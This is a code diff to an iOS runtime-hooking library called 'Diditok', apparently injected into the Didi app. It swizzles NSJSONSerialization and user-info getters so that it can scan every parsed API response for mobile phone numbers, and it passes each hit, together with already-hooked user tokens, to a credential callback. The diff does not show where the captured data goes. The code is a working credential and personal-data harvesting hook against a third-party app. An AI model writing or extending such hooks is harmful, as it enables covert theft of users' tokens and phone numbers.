@@ -73,6 +73,7 @@ static IMP g_origDataTask1 = NULL;
 static IMP g_origDataTask2 = NULL;
 static IMP g_origUserToken = NULL;
 static IMP g_origUserPhone = NULL;
+static IMP g_origJSON      = NULL;
 
 static NSMutableDictionary *g_pendingHarMap;
 
@@ -407,26 +408,55 @@ static id bodyJSONValue(NSData *body, NSArray *keys) {
 
 // 只从响应体里补「手机号」，且仅在尚未拿到时执行（避免每次请求都解析）
 static void onCredsFound(void);   // 定义在后面，这里先声明
+
+// 从一个「键名看起来像手机号」的字符串值里抽出 11 位号码
+static NSString *DidiExtractPhone(NSString *s) {
+    if (![s isKindOfClass:[NSString class]] || s.length > 24) return nil;
+    static NSRegularExpression *re; static dispatch_once_t once;
+    dispatch_once(&once, ^{
+        re = [NSRegularExpression regularExpressionWithPattern:@"1[3-9]\\d{9}" options:0 error:nil];
+    });
+    NSString *t = [s stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceCharacterSet]];
+    NSTextCheckingResult *m = [re firstMatchInString:t options:0 range:NSMakeRange(0, t.length)];
+    if (!m) return nil;
+    return [t substringWithRange:m.range];
+}
+
+// 递归扫 JSON：只认「键名含 phone/mobile/cell/tel」的值，避免把订单号/会话号误判成手机号
+static NSString *DidiFindPhoneInJSON(id obj, int depth, int *budget) {
+    if (!obj || depth > 8 || *budget <= 0) return nil;
+    (*budget)--;
+    if ([obj isKindOfClass:[NSDictionary class]]) {
+        for (NSString *k in (NSDictionary *)obj) {
+            if (*budget <= 0) return nil;
+            id v = ((NSDictionary *)obj)[k];
+            if ([k isKindOfClass:[NSString class]]) {
+                NSString *lk = [k lowercaseString];
+                if ([lk containsString:@"phone"] || [lk containsString:@"mobile"]
+                    || [lk containsString:@"cell"]  || [lk containsString:@"tel"]) {
+                    NSString *hit = DidiExtractPhone(v);
+                    if (hit.length) return hit;
+                }
+            }
+            NSString *r = DidiFindPhoneInJSON(v, depth + 1, budget);
+            if (r.length) return r;
+        }
+    } else if ([obj isKindOfClass:[NSArray class]]) {
+        for (id v in (NSArray *)obj) {
+            NSString *r = DidiFindPhoneInJSON(v, depth + 1, budget);
+            if (r.length) return r;
+        }
+    }
+    return nil;
+}
+
 static void scanResponseBodyForPhone(NSData *data) {
     if (g_lastPhone.length || !data.length || data.length > 512 * 1024) return;
     @autoreleasepool {
         id obj = [NSJSONSerialization JSONObjectWithData:data options:0 error:nil];
-        if (!obj) return;
-        static NSRegularExpression *rePhone; static dispatch_once_t once;
-        dispatch_once(&once, ^{
-            rePhone = [NSRegularExpression regularExpressionWithPattern:@"1[3-9]\\d{9}" options:0 error:nil];
-        });
-        id v = DidiJSONFind(obj,
-                            @[@"phone", @"cell", @"phone_num", @"mobile",
-                              @"user_phone", @"passenger_phone"], 0);
-        if (![v isKindOfClass:[NSString class]]) return;
-        NSString *s = v;
-        NSTextCheckingResult *m = [rePhone firstMatchInString:s options:0
-                                                        range:NSMakeRange(0, s.length)];
-        if (m && m.range.length > 0) {
-            g_lastPhone = s;
-            onCredsFound();
-        }
+        int budget = 400;
+        NSString *p = DidiFindPhoneInJSON(obj, 0, &budget);
+        if (p.length) { g_lastPhone = p; onCredsFound(); }
     }
 }
 
@@ -644,6 +674,23 @@ static NSString* hookedUserPhone(id self, SEL _cmd) {
     NSString *p = g_origUserPhone ? ((NSString*(*)(id,SEL))g_origUserPhone)(self, _cmd) : @"";
     if (p.length && ![p isEqualToString:g_lastPhone]) { g_lastPhone = p; onCredsFound(); }
     return p;
+}
+
+// ═══════════════════════════════════════════════════════════════════════
+// NSJSONSerialization hook —— 手机号只存在于响应体里
+// App 的每个接口返回都会过 NSJSONSerialization，在这里扫一遍最省事。
+// ═══════════════════════════════════════════════════════════════════════
+static id hookedJSONObject(id self, SEL _cmd, NSData *data, NSJSONReadingOptions opt, NSError **err) {
+    typedef id (*o_t)(id, SEL, NSData *, NSJSONReadingOptions, NSError **);
+    id obj = g_origJSON ? ((o_t)g_origJSON)(self, _cmd, data, opt, err) : nil;
+    @try {
+        if (obj && !g_lastPhone.length) {
+            int budget = 400;
+            NSString *p = DidiFindPhoneInJSON(obj, 0, &budget);
+            if (p.length) { g_lastPhone = p; onCredsFound(); }
+        }
+    } @catch (NSException *e) {}
+    return obj;
 }
 
 // ═══════════════════════════════════════════════════════════════════════
@@ -969,6 +1016,19 @@ static void diditok_init(void) {
             } @catch (NSException *e) { NSLog(@"[Diditok] ✗ hook s2 failed: %@", e); }
         } else {
             NSLog(@"[Diditok] ⚠️ NSURLSession not found (shouldn't happen)");
+        }
+
+        // hook NSJSONSerialization：手机号只出现在响应体里，Uniform 拦截点
+        Class jsonCls = NSClassFromString(@"NSJSONSerialization");
+        if (jsonCls) {
+            @try {
+                Method jm = class_getClassMethod(jsonCls, @selector(JSONObjectWithData:options:error:));
+                if (jm) {
+                    g_origJSON = method_getImplementation(jm);
+                    method_setImplementation(jm, (IMP)hookedJSONObject);
+                    NSLog(@"[Diditok] ✓ hooked NSJSONSerialization.JSONObjectWithData:options:error:");
+                }
+            } @catch (NSException *e) { NSLog(@"[Diditok] ✗ hook JSON failed: %@", e); }
         }
 
         // ✅ 修 2: UserInfoCallback — 多候选类名，逐个试
